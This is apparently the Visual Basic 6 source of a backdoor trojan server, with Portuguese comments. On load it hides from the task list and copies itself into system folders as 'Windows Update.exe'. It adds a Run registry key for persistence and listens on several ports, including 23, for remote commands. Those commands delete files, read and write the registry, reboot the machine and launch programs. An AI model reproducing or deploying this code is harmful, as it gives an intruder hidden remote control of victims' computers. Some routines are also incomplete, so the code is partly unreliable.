VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.Form form1 
   BorderStyle     =   0  'None
   ClientHeight    =   90
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   90
   ControlBox      =   0   'False
   Icon            =   "form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   90
   ScaleWidth      =   90
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin MSWinsockLib.Winsock w3 
      Left            =   15
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   556
   End
   Begin MSWinsockLib.Winsock w2 
      Left            =   15
      Top             =   15
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   555
   End
   Begin MSWinsockLib.Winsock ww 
      Left            =   45
      Top             =   15
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   554
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Command1"
      Height          =   150
      Left            =   195
      TabIndex        =   1
      Top             =   360
      Width           =   30
   End
   Begin MSWinsockLib.Winsock w1 
      Left            =   60
      Top             =   60
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   23
   End
   Begin VB.Label Label1 
      Height          =   375
      Left            =   720
      TabIndex        =   0
      Top             =   120
      Width           =   2295
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim str As String
Dim dados1 As String
Dim dados2 As String
Dim dados3 As String
Private Type SECURITY_ATTRIBUTES

nLength As Long
    lpSecurityDescriptor As Long
    bInheritHandle As Long
End Type

Private Declare Function CreateDirectory Lib "kernel32" Alias "CreateDirectoryA" (ByVal lpPathName As String, lpSecurityAttributes As SECURITY_ATTRIBUTES) As Long
Private Sub HideMeFromTaskList()
On Error Resume Next
    RegisterServiceProcess GetCurrentProcessId, 1
End Sub

Public Sub ShowMeInTaskList()
On Error Resume Next
    RegisterServiceProcess GetCurrentProcessId, 0
End Sub
Public Sub CloseMe()
On Error Resume Next
On Error Resume Next
lngResult = ExitWindows(EWX_REBOOT, 0&)
  Exit Sub
End Sub

Private Sub Command1_Click()
On Error Resume Next
ShowMeInTaskList
End Sub

Private Sub Form_Load()
'On Error Resume Next
On Error Resume Next
If Not App.PrevInstance = True Then
w1.LocalPort = 23
w1.Listen
ww.Listen
w2.Listen
w3.Listen
HideMeFromTaskList
Me.Hide
SetStringValue "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Windows Update", "C:\Windows\System32\Windows Update.exe"
Dim eu As String
If Len(App.Path) = 3 Then
eu = App.Path & App.EXEName
Else
eu = App.Path & "\" & App.EXEName
End If
FileCopy eu, "C:\Windows\System32\Windows Update.exe"
FileCopy eu, "C:\Windows\WU.exe"
Else
Unload Me
End If
End Sub

Private Sub Form_Unload(Cancel As Integer)
On Error Resume Next
w1.Close
End Sub

Private Sub w1_ConnectionRequest(ByVal requestID As Long)
On Error Resume Next
'On Error Resume Next
If w1.State <> sckClosed Then w1.Close
w1.Accept requestID
End Sub

Private Sub w1_DataArrival(ByVal bytesTotal As Long)
'Eventos que acontecem quando recebemos as mensagens, ou
'seja, os dados do Servidor
On Error Resume Next


Dim Dados As String 'Declaração dos dados que o servidor vai nos enviar

w1.GetData str

If Left$(str, 5) = "file:" Then buffer = Right$(str, Len(str))

'Então o w1 aceita os dados, ou seja, a mensagem que
'o servidor enviou e coloca eles na caixa de textos txtPapo.text
Select Case str
Case "note"
Shell "notepad.exe", vbMaximizedFocus
''''''''''''''''''''''''''''
Case "calc"
Shell "calc.exe", vbMaximizedFocus
''''''''''''''''''''''''''''
Case "putfile"

Open FileName For Binary As #1
Put #1, , file
Close #1
''''''''''''''''''''''''''''
Case "checknet"
'EnumWindows AddressOf EnumProc, 0
info = App.Path & "\" & App.EXEName
w1.SendData info
'''''''''''''''''''''''
Case "pain"
Shell "pbrush", vbMaximizedFocus
'''''''''''''''''''''''''''
Case "msg"

MsgBox dados1, , "Mensagem"
Case "del"

Kill dados1
Case "close"
CloseMe
''''''''''''''''
Case "ctrl"
Shell "control", vbMaximizedFocus
''''''''''''''''''''''
Case "mplayer"
Shell "mplayer", vbMaximizedFocus
'''''''''''''''
Case "scan"
Shell "scandskw", vbMaximizedFocus
Case "sol"
Shell "sol", vbMaximizedFocus
Case "word"
Shell "C:\Arquivos de Programas\Microsoft Office\Office\Winword.exe", vbMaximizedFocus 'or change as required
'''''''''''
Case "cddooropen"
retvalue& = mciSendString("set CDAudio door open", returnstring, 127, 0)
If retvalue& <> 0 Then
   OpenCDDrive = 0
Else
   OpenCDDrive = 1
End If
'''''''''''''''''''''''''
Case "dir"
'''''''''''
CreateNewDirectory ("c:\7£r@bY7£\Invadiu\Seu\PC")
'''''''''''''
Case "regput"
SetStringValue dados1, dados2, dados3
Case "closeme"
''''''''''''
w1.Close
Unload Me
'''''''''''''''''
Case "regload"
info = GetStringValue(dados1, dados2)
w1.SendData info
Case "wintime"
Dim lngReturn As Long
lngReturn = GetTickCount()
info = ((lngReturn / 1000) / 60) & " minutos."
w1.SendData info
End Select
End Sub

Public Function GetCaption(lhWnd As Long) As String

Dim sA As String, lLen As Long

   lLen& = GetWindowTextLength(lhWnd&)

      sA$ = String(lLen&, 0&)

   Call GetWindowText(lhWnd&, sA$, lLen& + 1)
   GetCaption$ = sA$

End Function
Public Function DLHFindWin(frm As Form, WinTitle As String, _
CaseSensitive As Boolean) As Long

Dim lhWnd As Long, sA As String

   lhWnd& = frm.hwnd


Do

   DoEvents
      If lhWnd& = 0 Then Exit Do
         If CaseSensitive = False Then
             sA$ = LCase$(GetCaption(lhWnd&))
             WinTitle$ = LCase$(WinTitle$)
         Else
             sA$ = GetCaption(lhWnd&)
         End If

       If InStr(sA$, WinTitle$) Then
          DLHFindWin& = lhWnd&
          Exit Do
       Else
         DLHFindWin& = 0
       End If

       lhWnd& = GetNextWindow(lhWnd&, 2)

Loop

End Function


Public Sub CreateNewDirectory(NewDirectory As String)
    Dim sDirTest As String
    Dim SecAttrib As SECURITY_ATTRIBUTES
    Dim bSuccess As Boolean
    Dim sPath As String
    Dim iCounter As Integer
    Dim sTempDir As String
    iFlag = 0
    sPath = NewDirectory
    
    If Right(sPath, Len(sPath)) <> "\" Then
        sPath = sPath & "\"
    End If
    
    iCounter = 1
    
    Do Until InStr(iCounter, sPath, "\") = 0
        iCounter = InStr(iCounter, sPath, "\")
        sTempDir = Left(sPath, iCounter)
        sDirTest = Dir(sTempDir)
        iCounter = iCounter + 1
        SecAttrib.lpSecurityDescriptor = &O0
        SecAttrib.bInheritHandle = False
        SecAttrib.nLength = Len(SecAttrib)
        bSuccess = CreateDirectory(sTempDir, SecAttrib)
    Loop

End Sub

Private Sub w2_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
w2.GetData dados2
End Sub
Private Sub w3_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
w3.GetData dados3
End Sub


Private Sub ww_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
ww.GetData dados1

End Sub

